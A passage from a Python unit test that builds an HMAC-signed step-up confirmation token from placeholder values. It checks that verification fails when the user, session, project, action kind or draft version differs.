                (root / "secrets/mailer/ADMIN_KEY").read_text().strip(),
                original["MAILER_TEMPLATE_ADMIN_KEY"],
            )
            self.assertFalse((root / "secrets/mailer/URL_SECRET").exists())

    def test_confirmation_is_session_action_version_and_digest_bound(self):
        if stepup is None:
            self.skipTest("IDR identity-specific grant")
        now = int(time.time())
        claims = {
            "sub": "a" * 64,
            "sid": "b" * 64,
            "project": "alpha",
            "kind": "magic_link",
            "version": 1,
            "digest": "c" * 64,
            "iat": now,
            "exp": now + 180,
            "jti": "d" * 32,
        }
        key = "e" * 64
        encoded = (
            base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
        )
        signing = hmac.new(key.encode(), stepup.CONTEXT, hashlib.sha256).digest()
        token = (
            "mp1."
            + encoded
            + "."
            + hmac.new(signing, encoded.encode(), hashlib.sha256).hexdigest()
        )
        payload = {"version": 1, "draft_digest": "c" * 64}
        stepup.verify(token, key, "a" * 64, "b" * 64, "alpha", "magic_link", payload)
        for actor, sid, project, kind, body in [
            ("z" * 64, "b" * 64, "alpha", "magic_link", payload),
            ("a" * 64, "f" * 64, "alpha", "magic_link", payload),
            ("a" * 64, "b" * 64, "bravo", "magic_link", payload),
            ("a" * 64, "b" * 64, "alpha", "invite", payload),
            (
                "a" * 64,
                "b" * 64,
                "alpha",
                "magic_link",
                {"version": 2, "draft_digest": "c" * 64},
            ),
        ]:
            with self.assertRaises(HTTPException):
                stepup.verify(token, key, actor, sid, project, kind, body)
